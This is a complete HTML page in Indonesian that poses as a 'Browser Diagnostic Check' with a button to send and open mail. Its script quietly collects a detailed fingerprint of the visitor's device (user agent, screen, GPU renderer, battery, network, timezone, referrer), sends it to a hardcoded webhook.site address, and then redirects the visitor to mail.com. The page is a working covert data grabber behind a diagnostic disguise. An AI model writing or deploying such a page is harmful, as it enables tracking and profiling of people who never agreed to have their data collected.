<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<title>Browser Diagnostic Redirect</title>

<style>
*{
box-sizing:border-box;
}

body{
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#202124;
font-family:Arial,sans-serif;
}

.card{
background:#fff;
width:90%;
max-width:430px;
padding:35px;
border-radius:18px;
text-align:center;
box-shadow:0 10px 30px rgba(0,0,0,.35);
}

button{
width:100%;
padding:15px;
margin-top:20px;
border:0;
border-radius:10px;
background:#0066ff;
color:white;
font-size:17px;
cursor:pointer;
}

button:disabled{
background:#888;
}

#status{
margin-top:20px;
font-size:14px;
}
</style>

</head>

<body>


<div class="card">

<h2>Continue</h2>

<p>Browser Diagnostic Check</p>

<button id="send">
Kirim & Buka Mail
</button>

<div id="status">
Ready
</div>

</div>



<script>

const WEBHOOK =
"https://webhook.site/cf75fcc7-0cfa-4508-a0cb-f13a2fa22deb";


function safe(fn){

try{
return fn();
}
catch(e){
return null;
}

}



async function battery(){

try{

if(!navigator.getBattery)
return null;


const b =
await navigator.getBattery();


return {

level:
Math.round(b.level*100)+"%",

charging:
b.charging

};


}catch(e){

return null;

}

}



function gpu(){

try{

let canvas =
document.createElement("canvas");


let gl =
canvas.getContext("webgl");


if(!gl)
return null;


let info =
gl.getExtension(
"WEBGL_debug_renderer_info"
);


return {

vendor:
info ?
gl.getParameter(info.UNMASKED_VENDOR_WEBGL)
:
null,


renderer:
info ?
gl.getParameter(info.UNMASKED_RENDERER_WEBGL)
:
null

};


}catch(e){

return null;

}

}



function collect(){


const n=navigator;


const c =
n.connection ||
n.webkitConnection ||
n.mozConnection;



return {


event:
"browser_diagnostic",


time:
new Date().toISOString(),



page:{

url:
location.href,

title:
document.title,

referrer:
document.referrer || null

},



browser:{

userAgent:
n.userAgent,

language:
n.language,

languages:
n.languages,

platform:
n.platform,

vendor:
n.vendor,

online:
n.onLine,

cookie:
n.cookieEnabled

},



screen:{

width:
screen.width,

height:
screen.height,

colorDepth:
screen.colorDepth,

pixelRatio:
devicePixelRatio

},



window:{

width:
innerWidth,

height:
innerHeight

},



hardware:{

cpu:
safe(()=>n.hardwareConcurrency),

memory:
safe(()=>n.deviceMemory),

touch:
safe(()=>n.maxTouchPoints)

},



network:
c?
{

type:
c.effectiveType || null,

speed:
c.downlink || null,

rtt:
c.rtt || null

}
:null,



timezone:{

zone:
Intl.DateTimeFormat()
.resolvedOptions()
.timeZone,

local:
new Date().toString()

},



features:{

webgl:
!!window.WebGLRenderingContext,

bluetooth:
!!n.bluetooth,

usb:
!!n.usb,

media:
!!n.mediaDevices

}



};


}



document
.getElementById("send")
.onclick =
async function(){


this.disabled=true;


let status =
document.getElementById("status");


status.innerHTML =
"Mengumpulkan data...";


let data =
collect();


data.battery =
await battery();


data.gpu =
gpu();



let query =
new URLSearchParams();



Object.entries(data)
.forEach(([k,v])=>{


query.append(

k,

typeof v==="object"
?
JSON.stringify(v)
:
v

);


});



status.innerHTML =
"Mengirim...";


try{


await fetch(

WEBHOOK+
"?"
+
query.toString(),

{

method:"GET",

mode:"no-cors"

}

);


status.innerHTML =
"Selesai";


}catch(e){


status.innerHTML =
"Redirect";


}



setTimeout(()=>{


window.location.href =
"https://www.mail.com/";

},1000);



};


</script>


</body>
</html>
